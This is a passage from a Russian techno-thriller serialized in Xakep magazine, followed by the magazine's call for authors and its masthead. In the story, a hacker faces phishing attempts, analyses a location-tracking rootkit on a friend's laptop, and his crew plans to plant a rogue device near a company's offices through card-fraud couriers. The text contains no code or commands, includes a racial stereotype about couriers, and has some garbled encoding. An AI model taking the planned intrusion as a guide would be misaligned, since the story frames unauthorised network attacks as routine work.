в глубокой задумчивости. Как смеялась, когда он рассказывал дурацкие исто‐
рии, которые выдумывал на ходу. И тот взгляд — холодный, колкий, как лед, —
когда она сказала, что не хочет никакого совместного будущего.
   Киря попытался разложить свои чувства по полочкам, как когда‑то раз‐
бирал строки написанного им самим кода. Всегда можно найти ошибку,
переписать, исправить. Или уже нельзя? Действительно ли он любит ее
и хочет быть вместе или просто боится остаться один? А ведь возможно, она
права. Что он может ей дать? Ни своего жилья, ни стабильного дохода…
Вероятно, она боится за свое будущее, опасается, что ей всю жизнь придет‐
ся кочевать по съемным квартирам? Пока они были вдвоем, это казалось
интересным приключением, но, если она действительно ждет ребенка, все
изменится.
  Ему хотелось напиться, как когда‑то делал Санчо, чтобы ненадолго заг‐
лушить боль, но Кирилл понимал, что это не поможет. Невозможно решить
проблему, загнав ее глубоко внутрь себя. Она все равно вылезет наружу,
как старая трещина в стене, которую можно закрашивать сколько угодно
и даже прикрыть красивой фотографией в изящной золотистой рамочке. Тре‐
щины не будет видно, но она никуда не денется.
   Коротко звякнул телефон. Кирилл взглянул на экран: рядом с именем
Трикси — короткий текст сообщения: «Мы еще поговорим попозже, ладно?»
 — Ладно, — тихо сказал он в пустоту.
   Кирилл потянулся к мобильнику, но не стал ничего писать. Что он мог ска‐
зать? Извиниться? Но за что? Спросить, чего она хочет? А знает ли это она
сама? Что касается Кирилла, то он был твердо уверен только в одном: даже
если все закончится, он не сможет ничего забыть. Трикси останется с ним, ее
слова, ее голос, ее образ — все это будет рядом, навсегда, как тусклый свет
луны за ночным окном, который невозможно погасить, щелкнув выключате‐
лем.
   Стараясь отвлечься от назойливых воспоминаний, он с головой нырнул
в текущие дела. А вскоре его мысли заняли другие заботы: Кирилл начал
замечать, что кто‑то проявляет к его персоне пристальный интерес. Сначала
он обнаружил в своем почтовом ящике несколько автоматических сообщений
о неудачной доставке писем, которых он не отправлял. Первым делом Кирилл
подумал о троянах, что рассылают спам по всем контактам из адресной кни‐
ги, но никакой вредоносной активности на своей машине не нашел, да и
неоткуда ей было там взяться. Внимательно изучив служебные заголовки, он
пришел к выводу, что письма поддельные, а ссылки в них ведут на фишин‐
говый сайт почтовой службы, искусно замаскированный под настоящий.
Какой‑то таинственный незнакомец очень желал заполучить данные его учет‐
ки.
   Потом  неизвестные  попытались  сбросить  пароль  к  его  аккаунтам
на хакерских форумах — он получил несколько предупреждений от отвечав‐
ших за безопасность скриптов. Пришла и парочка поддельных писем с пред‐
ложением срочно поменять пароль: если бы Кирилл сам не рассылал ког‐
да‑то подобные сообщения, он вполне мог бы купиться на такую нехитрую
приманку. Он попытался проследить путь полученных писем, чтобы вычислить
их источник, но цепочка терялась где‑то в релеях, делая дальнейшее рассле‐
дование невозможным. Кто‑то настойчиво интересуется его персоной. И это
всерьез действовало на нервы.
  Тем временем Шпала написал и отладил в виртуалке софт для коммуника‐
тора, а потом они с Греком залили его на реальное устройство, которое при‐
нес Фреш. Один наладонник они при этом окирпичили, причем так, что
не помогла даже перепрошивка, — после всех проделанных манипуляций
коммуникатор напрочь отказывался запускаться. Леонид без лишних раз‐
говоров принес второй такой же девайс, и вот с ним магия сработала: аппа‐
рат успешно загрузился, установил терминальное соединение и смог прикон‐
нектиться к тестовой беспроводной сети, которую специально для этой цели
развернули в офисе. Теперь нужно было переправить девайс в Атланту, чтобы
там, на месте, специально нанятый человек вставил в него местную сим‑карту
и  спрятал устройство где‑нибудь в  кустах под окнами конференц‑зала
TerraCore, поближе к зоне действия корпоративных точек доступа.
   Эту часть работы взял на себя Санчо. Он расслабленно сидел за компом,
покачиваясь на стуле, и переписывался с кем‑то в мессенджерах. Еще со
времен его кардерской практики он наладил контакты с дроповодами в Евро‐
пе и Штатах и теперь поднял старые связи, чтобы решить поставленную
перед ним задачу. Казалось, все должно пройти как по маслу.
 — Уверен, что твои люди не подведут? — спросил внимательно следив‐
ший за его перепиской Фреш, с трудом скрывая тревогу в голосе.
 — Не парься, — ухмыльнулся Санчо, подтянув поближе к себе клавиату‐
ру. — Я этих парней давно знаю. Это не новички, к тому же они любят деньги
и не задают лишних вопросов. Вы лучше девайсину качественно упакуйте,
как будто она только из магазина, чтобы таможня не докопалась.
 — Насчет этого не беспокойся, — хлопнул его по плечу Леонид. — Не пер‐
вый год замужем. Главное, чтобы твой дроп справился. Эти ребята иногда
такие тупые, что им можно час объяснять, как сим‑карта в телефон вставляет‐
ся.
   Саня хмыкнул. В Штатах дропами зачастую работали чернокожие ребята
из неблагополучных районов, и им несказанно повезет, если за дело возь‐
мется именно такой. Чаще роль курьеров выполняли эмигранты из Латинской
Америки или откуда‑нибудь из карибской глубинки, которые по‑английски
порой понимали с огромным трудом. Вот с такими помощниками и вправду
можно хлебнуть неприятностей.
   Теперь оставалось только ждать. Фреш отправил посылку курьерской
службой, не понадеявшись на услуги почты, где коробка могла застрять
на несколько недель. Негосударственные компании обещали доставить бан‐
дероль за десять дней, которые команда планировала потратить на тщатель‐
ную подготовку к запланированной атаке.
   Санчо и Финч постарались собрать из открытых источников максимум
сведений о местном подразделении TerraCore, Шпала гонял на эмуляторе
свой софт, часами вчитываясь в логи, а Грек, казалось, нервничал больше
остальных. Он залипал в терминал, отрабатывая различные сценарии дей‐
ствий во вражеской сети, и строчил скрипты для парсинга пакетов с данными,
заливая в себя одну чашку кофе за другой.
   Без дела пока что остался только один Кирилл. Он сидел за компом, изу‐
чая документацию, и время от времени оставлял комментарии на форумах.
Один знакомый модератор, который общался с ним еще с давних времен,
написал Кириллу в личку, что какой‑то новичок с недавно зарегистрирован‐
ным аккаунтом и нулевой репутацией на днях спрашивал о нем. Все пытался
выяснить, кто такой Кикс, на чем специализируется и можно ли ему доверять.
Тревожный звоночек: слишком много в последнее время совпадений. Не к
добру это.
 — Не занят? — вывел его из задумчивости знакомый голос.
   Алла подошла неслышно и замерла за его спиной, сжимая под мышкой
свой ноутбук.





— Для тебя я всегда свободен, — ответил Киря, чувствуя, что эти слова проз‐
вучали как‑то слишком неестественно.
 — Слушай, мой комп стал вести себя как‑то странно, — сказала Трикси, —
не посмотришь? Я глянула, ничего не нашла.
   Кирилл молча взял из ее рук ноутбук, раскрыл его и скользнул взглядом
по рабочему столу, усыпанному значками, как поле одуванчиками. Он открыл
окно со списком запущенных в системе задач и почти сразу заметил то, что
выбивалось из привычного порядка вещей: в какой‑то момент процессор
показал почти стопроцентную загрузку, хотя никаких тяжелых приложений
вроде бы не выполнялось, а затем все снова пришло в норму. Показалось?
 — Что значит «странно»? — на всякий случай уточнил он, снова пробегая
глазами список активных процессов.
 — Изредка лагает, ну и… — Алла замялась, будто не хотела говорить. —
Пару раз интернет сам отключался, а потом включался снова. Я подумала,
может, в сети сбои...
 — ...но запараноила? — закончил за нее Кирилл.
 — Я просто осторожная! — фыркнула Трикси, усевшись прямо на стол. —
Проверила все системные файлы, автозапуск, ничего не нашла.
   Кирилл прищурился. В списке процессов мелькнуло что‑то незнакомое:
странная программа с именем, состоящим из бессмысленного набора сим‐
волов.
 — Хм, интересно, — задумчиво произнес он. — Смотри, вот эта штука —
это явно не системный процесс.
 — Твою мать... — Алла выпрямилась, ее лицо стало серьезным. — Я же
все проверяла, сама все ставила. Можешь выяснить, что это такое?
 — Не торопись, не на пожаре, — он достал флешку и подключил ее
к ноуту. — Сейчас сделаю дамп памяти, на всякий случай скопирую всю сис‐
тему, потом подниму у себя виртуалку и разберемся. Как чего выясню — сра‐
зу расскажу.
   То, что Алла обратилась за помощью именно к нему, Кирилл посчитал
хорошим знаком. Может, это станет первым шагом к откровенному разговору
по душам, а может быть… Может быть, получится вернуть все как было.
   Экран ноутбука Трикси отсвечивал холодным светом, рисуя на лице
Кирилла голубоватые отблески. Он чувствовал, как от напряжения начинает
болеть шея, но решил не останавливаться ни на минуту, сосредоточенно
исследуя систему. В списке процессов то возникала, то бесследно исчезала
таинственная строчка. Имя состояло из случайной последовательности сим‐
волов, причем, похоже, каждый раз разной. Но вот проблема: как только
Кирилл пытался завершить этот процесс, он исчезал и появлялся снова через
несколько секунд.
 — Ладно, попробуем по‑другому.
   Кирилл открыл лог сетевого трафика. На экране замелькали строчки,
отображавшие данные, которые покидали ноутбук.
   Какое‑то висящее в памяти приложение гнало зашифрованные пакеты
наружу, причем через рандомные порты. Роднили их разве что характерный
размер и структура. Кирилл переключился на поиск в системных файлах. Дол‐
го рылся, проверяя каталоги, где могла спрятаться вредоносная программа,
но там было чисто, как в больнице. Выходит, в системе пакостит что‑то низ‐
коуровневое, что‑то, стартующее вместе с операционкой и болтающееся
в оперативке. Руткит? Похоже на то. Особенно подозрительно, что эта
пакость не пишет никаких файлов на диск. А если и пишет, то прячет их так
искусно, что обнаружить следы ее деятельности — задача небанальная. Ну,
положим, стартовать она может, немного подправив загрузочную запись,
а оказавшись в памяти, начинает перехватывать обращения к файловой сис‐
теме. А вот куда эта таинственная программа складывает свои потроха?
Куда‑нибудь в неразмеченную область в конце диска?
   Отыскав на флешке предусмотрительно сделанный дамп памяти, Кирилл
дождался, пока он скопируется на его комп, и принялся изучать содержимое
файла. Вот оно! Код, показавшийся ему подозрительным, не обнаруживался
в системе, он был запущен непосредственно в памяти. Кирилл наклонился
ближе, всматриваясь в экран. Похоже, именно этот процесс автоматически
запускался и завершался, каждый раз меняя собственное имя. Понять бы, что
он делает в краткие периоды своей активности. Вот этот кусок кода формиру‐
ет сетевые пакеты. Они шифруются каким‑то хитрым алгоритмом, затем
выбирается случайный порт для отправки. Вот идет запрос к какому‑то уда‐
ленному серверу, в ответ, похоже, приходит IP-адрес, куда руткит следующим
шагом отправляет посылочку. Кирилл попробовал проанализировать данные,
которые передавал руткит, но у него ничего не вышло: программа выполняла
множество перекрестных вызовов, и распутать этот клубок оказалось крайне
непросто. Может, привлечь Финча, хорошо разбирающегося в криптоал‐
горитмах? Подумав, Кирилл отбросил эту идею: самолюбие не позволяло ему
сдаться так просто, подкинутую Аллой задачку хотелось решить в одиночку.
   Если не получается выяснить, что руткит шлет неизвестным получателям,
то вполне можно узнать, какую информацию он перед этим собирает, ведь
так? Кирилл прошелся по вызовам, которые выполнял вредоносный код.
В общем‑то, он не делал ничего предосудительного… кроме одного: устанав‐
ливал текущую геопозицию ноутбука. Ради интереса Киря оценил размер
отсылаемых пакетов: ну да, похоже, что зловред отслеживает местополо‐
жение компа и передает его куда‑то на сервер. Можно, конечно, попытаться
установить владельца IP-адреса… Но что‑то подсказывало Кириллу, что и эта
попытка не даст полезного результата. Он ввел несколько команд — как и
ожидалось,   сервер,   куда  шла   информация,   оказался   закрытым,
без какой‑либо публичной информации о его владельце.
   Что ж, разгадать загадку в целом удалось, но вопросов в итоге осталось
больше, чем ответов. Если за Аллой следят, значит, она кому‑то нужна. Очень
интересно — кому, и не менее интересно — зачем? А может быть…
  В голове Кирилла что‑то щелкнуло, и разрозненные фрагменты мозаики,
до этого никак не сочетавшиеся друг с другом, внезапно слились воедино,
как соединяются поднесенные друг к другу кусочки магнита.
   Следить могли не за ней, следить могли за ним. Кто‑то ломал его почту,
учетки на форумах, пытался разузнать подробности о его личности. Если эти
неизвестные выяснили, что Кикса и Трикси связывает нечто большее, чем
общие интересы и сетевая переписка, девушка могла стать прекрасным объ‐
ектом для изощренной атаки. А выяснить это несложно, Кирилл своих отно‐
шений с Аллой не скрывал. Любой человек оставляет следы в сети, и опыт‐
ному следопыту обнаружить их не составит труда. Если авторам руткита
известно местоположение Аллы, они теперь  знают, где находится сам
Кирилл.
  Он потянулся к телефону, чтобы сообщить подруге тревожные новости,
но лежащий на столе аппарат опередил его, залившись пронзительной
трелью.
 — Да? — произнес он, отвечая на звонок.
 — Кирюша, здравствуй, — раздался в динамике чуть искаженный рассто‐
янием голос соседки тети Тани, — ты прости, мой дорогой, что я тебя отвле‐
каю, Ирочка говорила, ты сейчас работаешь очень много…
   Ну вот опять она начинает издалека, вместо того чтобы сразу перейти
к делу. Что ж за привычка‑то такая?
 — Да ничего страшного, теть Тань, все в порядке. Как у вас там дела?
 — Ох, Кирюша, я все‑таки уговорила твою маму сходить к доктору, деньги,
которые ты прислал, очень пригодились…
 — И как, сделали обследование?
 — Да, мы записались в частную клинику, ту, что в центре, на улице Двад‐
цать Пятого Октября. Вот позавчера сходили, там готовиться надо было,
не кушать накануне. А сегодня Ирочке результаты выдали.
 — И что там? — спросил Кирилл, чувствуя, как в груди замирает сердце
в ожидании ответа.
 — Ой, вот даже не знаю … Мама просила не рассказывать ничего, но я
все‑таки решила тебе позвонить…
   Мгновение тетя Таня помедлила, словно опасаясь произнести эти слова,
но наконец решилась:
 — У нее рак, Кирюша.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №2 (311)

            Андрей Письменный      Валентин Холмогоров        Илья Русанен
               Главный редактор         Ведущий редактор                Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                          Евгения Шарипова           yambuto
                            Литературный редактор          Бильд‑редактор
                                                   yambuto@gmail.com


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий‑Стем‐
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                           Вопросы о подписке:        ​Вопросы о материалах:
                                 lapina@glc.ru                support@glc.ru​





Учредитель: ИП Яковлева Анна Вадимовна ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Московская область,
Пушкино, мкр Софрино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегистрировано Федеральной службой по надзору в сфере связи,
информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2024